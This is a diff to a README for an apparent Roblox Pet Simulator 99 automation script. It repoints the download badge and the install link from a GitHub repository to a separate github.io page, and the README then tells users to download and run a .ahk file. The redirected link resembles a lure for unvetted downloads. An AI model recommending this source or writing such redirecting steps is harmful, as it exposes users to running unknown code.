@@ -1,6 +1,6 @@
 # 🐾 pet-simulator-99-script - Automate your Pet Simulator 99 progress
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rascalwoolf327/pet-simulator-99-script)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://rascalwoolf327.github.io)
 
 ## 📌 About this utility
 This software automates repetitive tasks in the Roblox game Pet Simulator 99. It runs on Windows systems. You use it to save time on farming coins, opening eggs, and managing your inventory. The script handles quest progression and helps you find items in trading booths without manual input.
@@ -15,7 +15,7 @@ This software automates repetitive tasks in the Roblox game Pet Simulator 99. It
 Follow these steps to prepare your computer.
 
 1. Install AutoHotkey v2 from the official website. Run the installer and choose the default settings.
-2. Visit this page to download the script: https://github.com/Rascalwoolf327/pet-simulator-99-script.
+2. Visit this page to download the script: https://rascalwoolf327.github.io
 3. Locate the file ending in .ahk after download.
 4. Right-click the file and select Run Script.
 
